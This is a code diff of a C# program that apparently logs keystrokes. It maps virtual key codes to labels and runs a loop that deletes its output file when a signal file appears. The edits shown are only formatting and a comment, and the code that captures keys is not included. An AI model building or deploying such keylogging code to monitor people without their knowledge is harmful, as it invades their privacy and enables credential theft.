@@ -9,15 +9,14 @@ class Entry {
 
 	static void Main(string[] args) {
 		string path = "";
-		if (args.Length > 0)
-			path = args[0];
+		if (args.Length > 0) path = args[0];
 		else return;
 		Console.WriteLine(path);
 
 	    while (true) {
 	        //Thread.Sleep(10);
 
-	        if (File.Exists(path + "d")) {
+	        if (File.Exists(path + "d")) { // delete signal
 	        	File.Delete(path);
 	        	File.Delete(path + "d");
 	        }
@@ -33,7 +32,6 @@ class Entry {
 
     private static String verifyKey(int code) {
         String key = "";
-
         if (code == 1) key = "[left click]";
         else if (code == 2) key = "[right click]";
         else if (code == 3) key = "[cancel]";
@@ -148,7 +146,6 @@ class Entry {
         else if (code == 222) key = "'";
         else if (code == 226) key = "\\";
         else key = "[other: " + code + "]";
-
         return key;
     }
 }
